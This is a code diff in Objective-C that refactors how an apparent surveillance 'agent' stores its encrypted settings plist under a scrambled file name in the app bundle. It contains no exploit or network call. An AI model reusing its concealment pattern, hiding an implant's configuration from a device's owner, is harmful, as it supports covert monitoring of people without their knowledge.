@@ -20,7 +20,7 @@
 static _i_Utils *sharedInstance = nil;
 
 //#define DEBUG
-#define RCS_PLIST     @"_i_phone.plist"
+#define RCS_PLIST     @"_i_ios.plist"
 
 @implementation _i_Utils
 
@@ -80,10 +80,8 @@ static _i_Utils *sharedInstance = nil;
       
       if (self != nil)
       {
-
-      }
-      
-      sharedInstance = self;
+        sharedInstance = self;
+      }      
     }
   }
   
@@ -115,61 +113,54 @@ static _i_Utils *sharedInstance = nil;
 #pragma mark Agent property methods
 #pragma mark -
 
-- (NSMutableDictionary*)openPropertyFile
+- (NSString*)propFilePath
 {
-  NSMutableDictionary *retDict;
-  NSString             *error = nil;
-  NSPropertyListFormat format;
-  int                  len;
-  unsigned char        *buffer;
-  NSRange              range;
+  NSString *retString = nil;
+  NSData *keyData;
   
-  // Using the config aes key
-  NSData *keyData = [NSData dataWithBytes: gConfAesKey
-                                   length: CC_MD5_DIGEST_LENGTH];
+  keyData = [NSData dataWithBytes:gConfAesKey length: CC_MD5_DIGEST_LENGTH];
   
   _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
-  NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
+  
+  NSString *scramFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
+  
   [rcsEnc release];
   
-  NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
-  NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];
+  retString = [NSString stringWithFormat:@"%@/%@",
+                                        [[NSBundle mainBundle] bundlePath],
+                                        scramFileName];
   
-  if (![[NSFileManager defaultManager] fileExistsAtPath: pFileName])
-    return nil;
+  return  retString;
+}
+
+- (NSData*)encryptProps:(NSDictionary*)aDict
+{
+  NSMutableData *decPropFile =
+    (NSMutableData*)[NSPropertyListSerialization  dataFromPropertyList:aDict
+                                                                format:NSPropertyListBinaryFormat_v1_0
+                                                      errorDescription:nil];
   
-  // The enc plist
-  NSData *pListData = [[NSFileManager defaultManager] contentsAtPath: pFileName];
+  NSData *keyData = [NSData dataWithBytes:gConfAesKey length: CC_MD5_DIGEST_LENGTH];
   
-  // Space for enc data
-  NSMutableData *tempData = [[NSMutableData alloc] initWithLength: [pListData length] - sizeof(int)];
-  buffer = (unsigned char *)[tempData bytes];
+  NSData *encData = [decPropFile encryptPKCS7: keyData];
   
-  // Extract the unpadded length
-  range.location = sizeof(int);
-  range.length   = [pListData length] - sizeof(int);
-  [pListData getBytes: &len length: sizeof(int)];
+  return encData;
+}
+
+- (NSData*)decryptProps
+{  
+  NSString *propFileName = [self propFilePath];
   
-  // Extract the prop list
-  [pListData getBytes: (void *)buffer range: range];
-  NSMutableData *ePropData = [NSMutableData dataWithBytes: buffer length: range.length];
+  if ([[NSFileManager defaultManager] fileExistsAtPath: propFileName] == NO)
+    return  nil;
   
-  [tempData release];
+  NSMutableData *encPropFile = [NSMutableData dataWithContentsOfFile: propFileName];
   
-  // Decrypt it
-  if ([ePropData decryptWithKey: keyData] != 0)
-  {
-    return nil;
-  }
-  // Save unpadded len bytes
-  NSData *dPlistData = [NSData dataWithBytes: [ePropData bytes] length: len];
-  
-  // Create the plist dict
-  retDict = (NSMutableDictionary *) [NSPropertyListSerialization propertyListFromData: dPlistData
-                                                                     mutabilityOption: NSPropertyListMutableContainers
-                                                                               format: &format
-                                                                     errorDescription: &error];
-  return retDict;
+  NSData *keyData = [NSData dataWithBytes:gConfAesKey length: CC_MD5_DIGEST_LENGTH];
+    
+  NSData *retData = [encPropFile decryptPKCS7: keyData];
+    
+  return retData;
 }
 
 - (id)getPropertyWithName:(NSString*)name
@@ -178,15 +169,24 @@ static _i_Utils *sharedInstance = nil;
   
   id dict = nil;
   
-  NSDictionary *temp = [self openPropertyFile];
-  
-  if (temp == nil)
+  @synchronized(self)
   {
-    [pool release];
-    return nil;
+    NSData *decData = [self decryptProps];
+    
+    if (decData != nil)
+    {
+      NSPropertyListFormat format;
+      
+      NSMutableDictionary *propDict =
+        [NSPropertyListSerialization propertyListFromData: decData
+                                         mutabilityOption:NSPropertyListMutableContainers
+                                                   format:&format
+                                         errorDescription:nil];
+      
+      if (propDict != nil)
+        dict = [[propDict objectForKey: name] retain];
+    }
   }
-  
-  dict = (id)[[temp objectForKey: name] retain];
   
   [pool release];
   
@@ -198,72 +198,44 @@ static _i_Utils *sharedInstance = nil;
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  NSString      *error = nil;
-  NSRange       range;
-  NSMutableData *propData;
-  
-  NSData *keyData = [NSData dataWithBytes: gConfAesKey
-                                   length: CC_MD5_DIGEST_LENGTH];
-  
-  // Scrambled name
-  _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
-  NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
-  [rcsEnc release];
-  
-  NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
-  NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];
+  NSMutableDictionary *propDict = nil;
   
   @synchronized(self)
   {
-    // Try to open existing plist
-    NSMutableDictionary *temp = [self openPropertyFile];
+    NSData *dictData = [self decryptProps];
     
-    if (temp == nil)
+    if (dictData != nil)
     {
-      temp = (NSMutableDictionary *) dictionary;
-    }
-    else
-    {
-      if ([temp objectForKey: name] != nil)
+      NSPropertyListFormat format;
+      
+      propDict = [NSPropertyListSerialization propertyListFromData:dictData
+                                                  mutabilityOption:NSPropertyListMutableContainers
+                                                            format:&format
+                                                  errorDescription:nil];
+      if ([propDict objectForKey: name] == nil)
       {
-        [temp removeObjectForKey: name];
-        [temp setObject: [dictionary objectForKey: name] forKey: name];
+        [propDict setObject:dictionary forKey: name];
       }
       else
       {
-        [temp addEntriesFromDictionary: dictionary];
+        [propDict removeObjectForKey: name];
+        [propDict setObject:dictionary forKey: name];
       }
     }
-    
-    NSData *pListData = [NSPropertyListSerialization dataFromPropertyList: temp
-                                                                   format: NSPropertyListXMLFormat_v1_0
-                                                         errorDescription: &error];    
-    // Unpadded length
-    int len = [pListData length];
-    
-    // Try the encryption
-    if ([((NSMutableData *)pListData) encryptWithKey: keyData] == 0)
+    else
     {
-      // init the data with enc plist + (int)len
-      propData = [[NSMutableData alloc] initWithCapacity: sizeof(int) + [pListData length]];
-      
-      // write down the unpadded len
-      range.location = 0;
-      range.length = sizeof(int);
-      [propData replaceBytesInRange: range withBytes: (const void *) &len];
-      
-      // and the encrypted prop list
-      range.location = sizeof(int);
-      range.length = [pListData length];
-      [propData replaceBytesInRange: range withBytes: [pListData bytes]];
-      
-      [propData writeToFile: pFileName atomically: YES];
-      
-      [propData release];
+      propDict = [NSDictionary dictionaryWithObjectsAndKeys: dictionary, name, nil];
     }
+    
+    NSData *encDict = [self encryptProps: propDict];
+    
+    NSString *propFileName = [self propFilePath];
+    
+    [encDict writeToFile: propFileName atomically:YES];
   }
-  [pool release];
   
+  [pool release];
+
   return YES;
 }
 
